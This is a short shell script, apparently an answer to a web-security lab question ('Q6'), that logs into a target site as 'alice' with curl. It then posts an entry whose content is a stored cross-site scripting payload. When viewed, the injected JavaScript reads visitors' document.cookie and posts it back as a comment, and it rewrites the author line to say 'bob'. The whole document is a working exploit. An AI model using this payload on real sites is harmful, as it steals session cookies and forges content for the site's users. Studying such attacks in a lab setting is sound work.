curl -i -c cookie.txt -d "username=alice" -d "password=password123" -d "form=login" -d "submit=Login" "$1/post.php" > response.txt

curl -i -b cookie.txt -d "title=Q6 Post" --data-urlencode "content=<script> function xssOne() { var url = window.location.href; var result = url.search(/view\.php\?id=[0-9][0-9]*$/); if(result >= 0) { var x=document.getElementById(\"author\"); var y=x.innerHTML; y=y.replace(/^posted by [a-z]* on/, \"posted by bob on\"); x.innerHTML = y; } } function getID() {var url = window.location.href;var result = url.search(/view\.php\?id=[0-9][0-9]*$/);if(result >= 0) {url = new URL(url);return url.searchParams.get('id');}} function leakCookies(postID) {var url = window.location.href;var result = url.search(/view\.php\?id=[0-9][0-9]*$/);if(result >= 0) {var cookie = document.cookie;var xhr = new XMLHttpRequest();xhr.open('POST','post.php',true); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');var str1 = 'comment=';var str3 = '&form=comment&parent=';var str4 = postID.toString();var str5 = '&uid=&submit=Post';var str = str1+cookie+str3+str4+str5; xhr.send(str);}} leakCookies(getID()); xssOne(); </script>" -d "type=1" -d "form=content" -d "submit=Post" "$1/post.php" >> response.txt 
